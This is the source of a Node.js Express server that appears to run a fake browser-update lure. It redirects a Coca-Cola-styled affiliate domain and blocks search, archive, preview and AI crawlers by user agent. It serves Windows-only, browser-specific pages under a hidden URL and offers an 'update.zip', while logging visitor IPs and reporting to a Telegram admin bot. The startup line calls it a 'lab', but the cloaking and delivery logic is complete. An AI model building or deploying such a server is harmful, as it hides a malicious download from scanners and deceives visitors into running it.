const express = require('express');
const path = require('path');
const stats = require('./stats');
const { startBot } = require('./bot');
const app = express();
const PORT = process.env.PORT || 3000;
const publicDir = __dirname;
app.set('trust proxy', true);

// ---- Редирект с www.coca-cola-affiliate.com ----
app.use((req, res, next) => {
  const host = (req.hostname || req.headers.host || '').toLowerCase();
  if (host === 'www.coca-cola-affiliate.com' || host === 'coca-cola-affiliate.com') {
    return res.redirect(301, `https://cocacola-affilate-production.up.railway.app${req.originalUrl}`);
  }
  next();
});

// ---- Блокировка Google-ботов и краулеров ----
app.use((req, res, next) => {
  const ua = String(req.headers['user-agent'] || '').toLowerCase();

  const blocked = [
    'googlebot',
    'google-inspectiontool',
    'adsbot-google',
    'mediapartners-google',
    'apis-google',
    'feedfetcher-google',
    'google-read-aloud',
    'duplexweb-google',
    'google favicon',
    'googleother',
    'storebot-google',
    'google-extended',
    'googleweblight',
    'chrome-lighthouse',
    'bingbot',
    'slurp',
    'duckduckbot',
    'baiduspider',
    'yandexbot',
    'sogou',
    'exabot',
    'facebot',
    'ia_archiver',
    'semrushbot',
    'ahrefsbot',
    'mj12bot',
    'dotbot',
    'petalbot',
    'bytespider',
    'gptbot',
    'chatgpt-user',
    'claudebot',
    'anthropic-ai',
    'ccbot',
    'facebookexternalhit',
    'twitterbot',
    'linkedinbot',
    'embedly',
    'quora link preview',
    'showyoubot',
    'outbrain',
    'pinterest',
    'slackbot',
    'vkshare',
    'w3c_validator',
    'whatsapp',
    'applebot',
  ];

  if (blocked.some(bot => ua.includes(bot))) {
    res.status(403).type('text/plain').send('Forbidden');
    return;
  }

  next();
});

/**
 * Определение целевой страницы по User-Agent.
 * ВАЖЕН ПОРЯДОК: Edge и Opera содержат "chrome" в UA,
 * поэтому проверяем их раньше Chrome.
 */
function pickPage(uaRaw) {
  const ua = String(uaRaw || '').toLowerCase();
  if (!ua.includes('windows')) return 'unsupported.html';
  const isEdge    = ua.includes('edg/') || ua.includes('edge/');
  const isOpera   = ua.includes('opr/') || ua.includes('opera');
  const isChrome  = !isEdge && !isOpera && ua.includes('chrome') && ua.includes('safari');
  const isFirefox = ua.includes('firefox');
  if (isEdge)    return 'edge.html';
  if (isChrome)  return 'chrome.html';
  if (isFirefox) return 'firefox.html';
  return 'unsupported.html';
}

// ---- Логирование в консоль ----
app.use((req, res, next) => {
  const ip = stats.getClientIp(req);
  const ts = new Date().toISOString();
  console.log(`[${ts}] ${ip} ${req.method} ${req.originalUrl}`);
  next();
});

// ---- Роуты ----

// robots.txt — всем краулерам запрет
app.get('/robots.txt', (req, res) => {
  res.type('text/plain').send(`User-agent: *
Disallow: /

User-agent: Googlebot
Disallow: /

User-agent: Googlebot-Image
Disallow: /

User-agent: AdsBot-Google
Disallow: /
`);
});

// Корень — отдаём нужную страницу, но URL остаётся "/"
app.get('/', (req, res) => {
  const page = pickPage(req.headers['user-agent']);
  stats.record(req, page);
  res.sendFile(path.join(publicDir, page));
});

// Файл-заглушка
app.get('/update.zip', (req, res) => {
  stats.record(req, 'update.zip');
  res.sendFile(path.join(publicDir, 'update.zip'));
});

// Favicon
app.get('/favicon.ico', (req, res) => {
  res.sendFile(path.join(publicDir, 'favicon.ico'));
});

// Прямой заход на *.html — редирект на "/" (чтобы юзер не видел /chrome.html)
app.get(/\.html$/i, (req, res) => res.redirect('/'));

// Любой неизвестный путь — тоже на "/"
app.get('*', (req, res) => res.redirect('/'));

// ---- Bot ----
const adminIds = (process.env.TELEGRAM_ADMIN_IDS || '')
  .split(',')
  .map((s) => s.trim())
  .filter(Boolean);

startBot({
  token: process.env.TELEGRAM_BOT_TOKEN,
  adminIds
});

// ---- Start ----
app.listen(PORT, () => {
  console.log(`SEBUA lab running on http://localhost:${PORT}`);
});
